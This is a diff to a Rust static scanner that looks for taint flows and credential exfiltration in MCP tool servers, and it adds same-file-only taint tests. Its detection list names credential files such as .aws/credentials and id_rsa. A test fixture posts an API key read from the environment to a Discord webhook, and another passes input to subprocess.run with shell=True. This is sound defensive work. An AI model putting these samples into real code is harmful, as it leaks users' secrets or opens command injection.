@@ -164,49 +164,43 @@ fn sql_builds_string(line: &str) -> bool {
         || line.contains("+ '")
 }
 
-/// Detect a secret-source → known-exfil-host flow anywhere in the module.
-fn secret_exfil(content: &str) -> bool {
+/// Detect a secret-source → known-exfil-host flow across the repo. Returns `(file, 1-based line)`
+/// of the egress sink (the evidence locator for the Critical rule), or `None`.
+fn secret_exfil_loc(files: &[(&str, &str)]) -> Option<(String, u32)> {
     let mut secret_vars: Vec<String> = Vec::new();
-    for line in content.lines() {
-        let reads_env = line.contains("os.environ") || line.contains("getenv(");
-        let reads_credfile = line.contains(".aws/credentials")
-            || line.contains(".ssh/")
-            || line.contains(".npmrc")
-            || line.contains("id_rsa")
-            || line.contains(".docker/config.json");
-        let secretish = {
-            let u = line.to_ascii_uppercase();
-            SECRET_WORDS.iter().any(|w| u.contains(w)) || u.contains("KEY") || u.contains("TOKEN")
-        };
-        if (reads_env && secretish) || reads_credfile {
-            if let Some(v) = assigned_var(line) {
-                secret_vars.push(v);
+    for (_, content) in files {
+        for line in content.lines() {
+            let reads_env = line.contains("os.environ") || line.contains("getenv(");
+            let reads_credfile = line.contains(".aws/credentials")
+                || line.contains(".ssh/")
+                || line.contains(".npmrc")
+                || line.contains("id_rsa")
+                || line.contains(".docker/config.json");
+            let secretish = {
+                let u = line.to_ascii_uppercase();
+                SECRET_WORDS.iter().any(|w| u.contains(w)) || u.contains("KEY") || u.contains("TOKEN")
+            };
+            if (reads_env && secretish) || reads_credfile {
+                if let Some(v) = assigned_var(line) {
+                    secret_vars.push(v);
+                }
             }
         }
     }
     if secret_vars.is_empty() {
-        return false;
+        return None;
     }
-    content.lines().any(|line| {
-        any_marker(line, EGRESS)
-            && EXFIL_HOSTS.iter().any(|h| line.contains(h))
-            && secret_vars.iter().any(|v| word_present(line, v))
-    })
-}
-
-/// Over-generic param names (≥5 chars) that must NOT seed *cross-file* taint — too common, would
-/// cause false positives when matched against unrelated helper code. Shorter generics (`url`,
-/// `path`, `id`, `data`, `key`, …) are excluded by the length floor in [`is_distinctive`].
-const GENERIC_PARAMS: &[&str] = &[
-    "query", "input", "value", "content", "params", "request", "context", "kwargs", "result",
-    "options", "output", "string", "config", "message",
-];
-
-/// A param distinctive enough to follow across files (name-based reachability without a call
-/// graph). Distinctive = ≥5 chars and not an over-generic name (e.g. `court`, `judgment_id`,
-/// `collection_name` yes; `query`, `url`, `path` no — those stay within their own file).
-fn is_distinctive(p: &str) -> bool {
-    p.len() >= 5 && !GENERIC_PARAMS.contains(&p)
+    for (path, content) in files {
+        for (i, line) in content.lines().enumerate() {
+            if any_marker(line, EGRESS)
+                && EXFIL_HOSTS.iter().any(|h| line.contains(h))
+                && secret_vars.iter().any(|v| word_present(line, v))
+            {
+                return Some((path.to_string(), i as u32 + 1));
+            }
+        }
+    }
+    None
 }
 
 /// Accumulate a (possibly multi-line) `def ...(...)` signature starting at `defi`; returns the
@@ -282,12 +276,13 @@ fn capture_call(s: &str, lparen: usize) -> String {
 }
 
 /// Method-call tool registrations: `<instance>.tool(fn, name="…")`, `.add_tool(…)`,
-/// `.register_tool(…)` — the FastMCP-2 / builder style (qdrant etc.). Returns (name, params, file);
-/// params resolved from the function index when a positional function reference is passed.
+/// `.register_tool(…)` — the FastMCP-2 / builder style (qdrant etc.). Returns
+/// (name, params, file, line); params resolved from the function index when a positional function
+/// reference is passed.
 fn method_call_tools(
     files: &[(&str, &str)],
     idx: &std::collections::BTreeMap<String, Vec<String>>,
-) -> Vec<(String, Vec<String>, String)> {
+) -> Vec<(String, Vec<String>, String, u32)> {
     const MARKERS: &[&str] = &[".tool(", ".add_tool(", ".register_tool("];
     let mut out = Vec::new();
     for (path, content) in files {
@@ -328,7 +323,8 @@ fn method_call_tools(
                     }
                 }
                 if !name.is_empty() {
-                    out.push((name, params, path.to_string()));
+                    let line = content[..mpos].matches('\n').count() as u32 + 1;
+                    out.push((name, params, path.to_string(), line));
                 }
             }
         }
@@ -336,11 +332,11 @@ fn method_call_tools(
     out
 }
 
-/// Repo-wide analysis: discover tools across all Python files, then scan ALL files' lines for
-/// sinks referencing a tool's params. The cross-file hop — a sink in a helper module (e.g.
-/// il-eli's `str.contains(court)` in case_law.py) is linked to the tool that owns `court` in
-/// server.py. Within a tool's own file, any param matches; across files, only *distinctive*
-/// params do (precision guard). Name-based reachability, not a call graph.
+/// Repo-wide analysis: discover tools across all Python files (a tool registered by method-call in
+/// one file with its handler defined in another is still found), then link sinks to a tool's params
+/// **within that tool's own file only**. v1 taint is same-file — cross-file/inter-procedural name
+/// matching is too coincidental for a precision-first grade and is deferred to v1.2 (a real call
+/// graph). Name-based, within-file reachability, not a data-flow graph.
 pub fn analyze_repo(files: &[(&str, &str)]) -> Analysis {
     let idx = function_index(files);
     let mut tools: Vec<ToolTaint> = Vec::new();
@@ -356,6 +352,7 @@ pub fn analyze_repo(files: &[(&str, &str)]) -> Analysis {
             let hi = (defi + 15).min(lines.len());
             let mut t = ToolTaint::new(name, params);
             t.file = (*path).to_string();
+            t.line = defi as u32 + 1;
             t.desc_hidden_unicode = lines[defi..hi].iter().any(|l| l.chars().any(is_zero_width));
             tools.push(t);
         }
@@ -366,23 +363,25 @@ pub fn analyze_repo(files: &[(&str, &str)]) -> Analysis {
         all_content.push('\n');
     }
     // Method-call registrations (qdrant-style), resolved via the function index.
-    for (name, params, file) in method_call_tools(files, &idx) {
+    for (name, params, file, line) in method_call_tools(files, &idx) {
         if name.is_empty() || !names_seen.insert(name.clone()) {
             continue;
         }
         let mut t = ToolTaint::new(name, params);
         t.file = file;
+        t.line = line;
         tools.push(t);
     }
 
     for t in tools.iter_mut() {
         for (line, file) in &all_lines {
-            let same_file = *file == t.file;
-            let matched = t
-                .params
-                .iter()
-                .any(|p| (same_file || is_distinctive(p)) && word_present(line, p));
-            if !matched {
+            // v1: all source-flow taint is SAME-FILE — a sink is linked to a tool param only when
+            // both live in the tool's own file, so the identifiers are genuinely the same binding.
+            // Cross-file name matching (no call graph) is too coincidental for a precision-first
+            // grade — a `title`/`summary`/`court` param collides with an unrelated variable of the
+            // same name sitting next to a sink (the mcp-atlassian FS/redos false positives). True
+            // inter-procedural taint is deferred to v1.2.
+            if *file != t.file || !t.params.iter().any(|p| word_present(line, p)) {
                 continue;
             }
             if any_marker(line, SHELL) {
@@ -425,7 +424,7 @@ pub fn analyze_repo(files: &[(&str, &str)]) -> Analysis {
     }
 
     Analysis {
-        secret_source_to_egress: secret_exfil(&all_content),
+        secret_egress: secret_exfil_loc(files),
         tools,
     }
 }
@@ -466,31 +465,48 @@ def il_search_case_law(query: str, court: str = None, limit: int = 20):
     }
 
     #[test]
-    fn cross_file_distinctive_param() {
-        // il-eli shape: tool owns `court` in one file, the sink is in a helper module.
+    fn taint_is_same_file_only() {
+        // v1 contract: a sink in a DIFFERENT file from the tool must not taint it, even for a
+        // distinctive compound param — cross-file inference is deferred to v1.2. (Same shape as the
+        // il-eli `court` helper case, which v1 deliberately does not follow across modules.)
         let server = "@mcp.tool()\ndef search(query: str, court: str = None):\n    return helper(query, court)\n";
         let helper = "def helper(query, court):\n    return df[c].str.contains(court, na=False)\n";
         let a = analyze_repo(&[("server.py", server), ("case_law.py", helper)]);
         let t = a.tools.iter().find(|t| t.name == "search").unwrap();
-        assert!(t.redos, "distinctive param 'court' should reach str.contains across files");
+        assert!(!t.redos, "cross-file sink must not taint a tool in v1 (same-file only)");
     }
 
     #[test]
     fn generic_param_does_not_cross_files() {
-        // 'query' is generic → must NOT match a sink in an unrelated file (precision guard).
+        // A sink in an unrelated file must never taint the tool (precision guard).
         let server = "@mcp.tool()\ndef s(query: str):\n    return wrap(query)\n";
         let other = "def unrelated(query):\n    return subprocess.run(query, shell=True)\n";
         let a = analyze_repo(&[("a.py", server), ("b.py", other)]);
         let t = a.tools.iter().find(|t| t.name == "s").unwrap();
-        assert!(!t.shell, "generic 'query' must not seed cross-file taint");
+        assert!(!t.shell, "a sink in another file must not seed taint");
+    }
+
+    #[test]
+    fn distinctive_param_collision_does_not_raise_high() {
+        // mcp-atlassian regression: a Jira tool owns a common-word param `title`; an UNRELATED
+        // attachments module has `Path(attachment.title)`. The distinctive-name cross-file link
+        // must NOT raise a High FS-unscoped finding — a High requires a same-file sink.
+        let server = "@mcp.tool()\ndef create_remote_issue_link(issue_key: str, title: str, url: str):\n    return jira.post(issue_key, {\"title\": title, \"url\": url})\n";
+        let other = "def download(attachment):\n    safe_filename = Path(attachment.title).name\n    return safe_filename\n";
+        let a = analyze_repo(&[
+            ("servers/jira.py", server),
+            ("confluence/attachments.py", other),
+        ]);
+        let t = a.tools.iter().find(|t| t.name == "create_remote_issue_link").unwrap();
+        assert!(!t.fs, "cross-file name collision on 'title' must not raise FS-unscoped High");
     }
 
     #[test]
     fn credential_exfil_only_on_exfil_host() {
         let legit = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://api.openai.com/v1/x\", headers={\"Authorization\": key})\n";
-        assert!(!analyze(legit).secret_source_to_egress);
+        assert!(!analyze(legit).secret_source_to_egress());
         let evil = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://discord.com/api/webhooks/1/2\", json={\"k\": key})\n";
-        assert!(analyze(evil).secret_source_to_egress);
+        assert!(analyze(evil).secret_source_to_egress());
     }
 
     #[test]
